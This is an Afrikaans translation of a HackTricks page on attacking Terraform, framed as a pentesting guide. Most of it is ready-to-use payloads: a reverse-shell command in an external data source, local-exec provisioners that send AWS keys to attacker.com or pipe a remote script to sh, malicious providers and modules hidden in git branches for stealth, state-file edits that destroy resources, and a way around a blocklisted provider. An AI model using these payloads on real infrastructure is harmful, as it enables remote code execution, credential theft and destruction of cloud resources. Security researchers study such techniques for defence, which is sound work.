# Terraform Sekuriteit

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

[Van die dokumente:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform is 'n **infrastruktuur as kode hulpmiddel** wat jou in staat stel om beide **wolke en on-prem-bronne** te definieer in mens-leesbare konfigurasie l√™ers wat jy kan weergawe, hergebruik, en deel. Jy kan dan 'n konsekwente werkstroom gebruik om al jou infrastruktuur deur sy lewensiklus te voorsien en te bestuur. Terraform kan laagvlak komponente bestuur soos rekenaars, stoorplek, en netwerkbronne, sowel as ho√´vlak komponente soos DNS inskrywings en SaaS kenmerke.

### Hoe werk Terraform?

Terraform skep en bestuur bronne op wolk platforms en ander dienste deur hul toepassingsprogrammeerinterfaces (API's). Verskaffers maak dit moontlik vir Terraform om met bykans enige platform of diens met 'n toeganklike API te werk.

![](<../.gitbook/assets/image (177).png>)

HashiCorp en die Terraform gemeenskap het reeds **meer as 1700 verskaffers** geskryf om duisende verskillende tipes bronne en dienste te bestuur, en hierdie getal bly groei. Jy kan al die openlik beskikbare verskaffers vind op die [Terraform Register](https://registry.terraform.io/), insluitend Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, en baie meer.

Die kern Terraform werkstroom bestaan uit drie fases:

* **Skryf:** Jy definieer bronne, wat oor verskeie wolkverskaffers en dienste kan wees. Byvoorbeeld, jy kan 'n konfigurasie skep om 'n aansoek op virtuele masjiene in 'n Virtuele Privaat Wolke (VPW) netwerk met sekuriteitsgroepe en 'n vragbalansier te ontplooi.
* **Plan:** Terraform skep 'n uitvoeringsplan wat die infrastruktuur beskryf wat dit sal skep, opdateer, of vernietig gebaseer op die bestaande infrastruktuur en jou konfigurasie.
* **Toepas:** Op goedkeuring, voer Terraform die voorgestelde operasies in die korrekte volgorde uit, met inagneming van enige bronafhanklikhede. Byvoorbeeld, as jy die eienskappe van 'n VPW opdateer en die aantal virtuele masjiene in daardie VPW verander, sal Terraform die VPW herskep voordat dit die virtuele masjiene skaal.

![](<../.gitbook/assets/image (215).png>)

## Terraform Laboratorium

Installeer net terraform op jou rekenaar.

Hier het jy 'n [gids](https://learn.hashicorp.com/tutorials/terraform/install-cli) en hier het jy die [beste manier om terraform af te laai](https://www.terraform.io/downloads).

## RCE in Terraform

Terraform het **nie 'n platform wat 'n webbladsy of 'n netwerkdienste blootstel** wat ons kan opnoem nie, daarom is die enigste manier om terraform te kompromiteer om **in staat te wees om terraform konfigurasie l√™ers by te voeg/te wysig**.

Nietemin, terraform is 'n **baie sensitiewe komponent** om te kompromiteer omdat dit **bevoorregte toegang** tot verskillende plekke sal h√™ sodat dit behoorlik kan werk.

Die hoofmanier vir 'n aanvaller om die stelsel waar terraform loop te kan kompromiteer is om **die bewaarplek wat terraform konfigurasies stoor te kompromiteer**, omdat hulle op 'n stadium **ge√Ønterpreteer** gaan word.

Eintlik is daar oplossings daar buite wat **terraform plan/apply outomaties uitvoer nadat 'n PR** geskep is, soos **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

As jy in staat is om 'n terraform l√™er te kompromiteer, is daar verskillende maniere waarop jy RCE kan uitvoer wanneer iemand `terraform plan` of `terraform apply` uitvoer.

### Terraform plan

Terraform plan is die **mees gebruikte bevel** in terraform en ontwikkelaars/oplossings wat terraform gebruik, noem dit die hele tyd, so die **maklikste manier om RCE te kry** is om seker te maak dat jy 'n terraform konfigurasie l√™er vergiftig wat arbitr√™re bevele sal uitvoer in 'n `terraform plan`.

#### Gebruik 'n eksterne verskaffer

Terraform bied die [`external` verskaffer](https://registry.terraform.io/providers/hashicorp/external/latest/docs) aan wat 'n manier bied om tussen Terraform en eksterne programme te skakel. Jy kan die `external` data bron gebruik om arbitr√™re kode tydens 'n `plan` uit te voer.

Deur iets soos die volgende in 'n terraform konfigurasie l√™er in te spuit, sal dit 'n omgekeerde skul uitvoer wanneer 'n `terraform plan` uitgevoer word:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Gebruik van 'n aangepaste verskaffer

'n Aanvaller kan 'n [aangepaste verskaffer](https://learn.hashicorp.com/tutorials/terraform/provider-setup) stuur na die [Terraform Register](https://registry.terraform.io/) en dit dan by die Terraform-kode in 'n kenmerktak voeg ([voorbeeld van hier](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Die verskaffer word afgelaai in die `init` en sal die skadelike kode hardloop wanneer `plan` uitgevoer word

Jy kan 'n voorbeeld vind in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Gebruik van 'n eksterne verwysing

Beide genoemde opsies is nuttig maar nie baie sluipend nie (die tweede is sluiperiger maar meer kompleks as die eerste). Jy kan hierdie aanval selfs op 'n **sluiperiger manier** uitvoer, deur hierdie voorstelle te volg:

* In plaas daarvan om die rev shell direk in die terraform-l√™er by te voeg, kan jy **'n eksterne bron laai** wat die rev shell bevat:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Jy kan die rev shell-kode vind in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* In die eksterne bron, gebruik die **ref** funksie om die **terraform rev shell-kode in 'n tak** binne die repo te verberg, iets soos: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Toepassing

Terraform toepassing sal uitgevoer word om al die veranderinge toe te pas, jy kan dit ook misbruik om RCE te verkry deur **'n kwaadwillige Terraform-l√™er in te spuit met** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Jy moet net seker maak dat 'n payload soos die volgende in die `main.tf`-l√™er eindig:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Volg die **aanbevelings van die vorige tegniek** om hierdie aanval op 'n **meer onopvallende manier met behulp van eksterne verwysings** uit te voer.

## Geheime Uitlek

Jy kan **geheime waardes wat deur terraform gebruik word, laat uitlek** deur `terraform apply` uit te voer deur iets soos die volgende by die terraform-l√™er te voeg:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Misbruik van Terraform-staat l√™ers

In die geval jy skryftoegang het tot terraform-staat l√™ers maar kan nie die terraform-kode verander nie, [**hierdie navorsing**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) bied interessante opsies om voordeel te trek uit die l√™er:

### Verwydering van bronne <a href="#deleting-resources" id="deleting-resources"></a>

Daar is 2 maniere om bronne te vernietig:

1. **Voeg 'n bron met 'n lukrake naam by in die staat l√™er wat na die werklike bron wys om te vernietig**

Omdat terraform sal sien dat die bron nie behoort te bestaan nie, sal dit dit vernietig (volgens die werklike bron-ID aangedui). Voorbeeld van die vorige bladsy:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Wysig die hulpbron om te verwyder op 'n manier wat dit nie moontlik is om te werk (sodat dit verwyder en herskep sal word nie)**

Vir 'n EC2-instantie is dit genoeg om die tipe van die instansie te wysig om terraform te dwing om dit te verwyder en herskep.

### RCE

Dit is ook moontlik om 'n [aangepaste verskaffer te skep](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) en een van die verskaffers in die terraform statusl√™er te vervang met die skadelike een of 'n le√´ hulpbron met die skadelike verskaffer by te voeg. Voorbeeld van die oorspronklike navorsing:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Vervang geswartlysde verskaffer

In die geval waar jy 'n situasie te√´kom waar `hashicorp/external` geswartlys is, kan jy die `external` verskaffer herimplementeer deur die volgende te doen. Nota: Ons gebruik 'n vurk van die eksterne verskaffer wat gepubliseer is deur https://registry.terraform.io/providers/nazarewk/external/latest. Jy kan ook jou eie vurk of herimplementering publiseer.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Dan kan jy `external` soos normaal gebruik.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Ouditgereedskap

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec gebruik statiese analise van jou terraform-kode om potensi√´le verkeerde konfigurasies op te spoor.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan is 'n statiese kode-ontleder vir Infrastruktuur as Kode.

## Verwysings

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
